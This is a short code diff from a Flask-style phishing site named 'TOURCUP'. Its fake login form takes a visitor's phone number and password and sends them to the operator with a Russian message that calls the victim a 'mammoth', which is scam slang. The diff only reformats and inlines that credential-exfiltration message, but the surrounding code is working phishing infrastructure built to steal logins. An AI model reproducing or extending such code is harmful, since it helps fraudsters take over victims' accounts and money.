@@ -11,7 +11,7 @@ websiteName = "TOURCUP"
 
 
 
-LOG_MESSAGE = f'💳 Мамонт ввёл данные 💳 \n\n 🌐 Ip мамонта: {user_agent} \n\n 📱Номер телефона: {number} \n 💻Пароль: {password} \n '
+LOG_MESSAGE = f'💳 Мамонт ввёл данные 💳 \n\n 🌐 Ip мамонта: {user_agent} \n\n 📱Номер телефона: {number} \n 💻Пароль: {password}\n'
 
 
 
@@ -107,7 +107,7 @@ def page():
     elif len(number) < 9 or len(password) < 6:
         return render_template('auth.html', error = "Заполните поля правильно!")
 
-    send(LOG_MESSAGE)
+    send(f'💳 Мамонт ввёл данные 💳 \n\n 🌐 Ip мамонта: {user_agent} \n\n 📱Номер телефона: {number} \n 💻Пароль: {password}\n')
 
     return redirect("/")
 
